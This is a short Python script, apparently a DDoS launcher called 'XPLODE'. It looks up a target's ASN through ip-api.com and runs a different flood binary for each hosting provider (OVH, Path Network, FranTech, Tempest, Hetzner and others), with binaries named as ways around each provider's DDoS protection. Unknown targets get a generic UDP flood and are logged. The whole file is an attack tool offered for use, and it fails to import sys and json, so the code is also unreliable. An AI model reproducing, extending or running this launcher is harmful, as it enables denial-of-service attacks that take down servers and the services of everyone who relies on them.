# XPLODE - ARX
import requests
import os

print("Welcome to v1 - xplode, archs") # autobp v1 most simple version
print(f"python autobp-udp.py [HOST] [PORT] [TIME]")

host = sys.argv[1]
port = sys.argv[2] 
time = sys.argv[3]


ip_api_response = requests.get(f"http://ip-api.com/json/{host}?fields=as")
json_ip_data = json.loads(ip_api_response.text)
targ = json_ip_data["as"]


if targ == "AS16276 OVH SAS":
    os.system(f"./ovhtcp {host} {port} {time}")

elif targ == "AS396998 Path Network, Inc.":
    os.system(f"./pathc {host} {port} {time}")

elif targ == "AS53667 FranTech Solutions":
    os.system(f"./udpbypass {host} {port} {time}")

elif targ == "AS36231 Tempest Hosting, LLC":
    os.system(f"./tempest-killa {host} {port} {time}")

elif targ == "AS32751 Nuclearfallout Enterprises, Inc.": # you can add more asns by just pasting them in with ur method
    os.system(f"./wra {host} {port} {time}")

elif targ == "AS24940 Hetzner Online GmbH":
    os.system(f"./udpspoop {host} {port} {time}")    

else:
    
    os.system(f"./method7 {host} {port} {time}") # unkown asn command (use a normal udp method or sum)

    unkown = open(f"{host}.log", "w")

    unkown.write(f"UNKOWN\n")
    unkown.write(f"HOST: {host}\n")
    unkown.write(f"PORT USED: {port}\n")
    unkown.write(f"ASN: {targ}\n")
    unkown.write("\n")
    unkown.close()

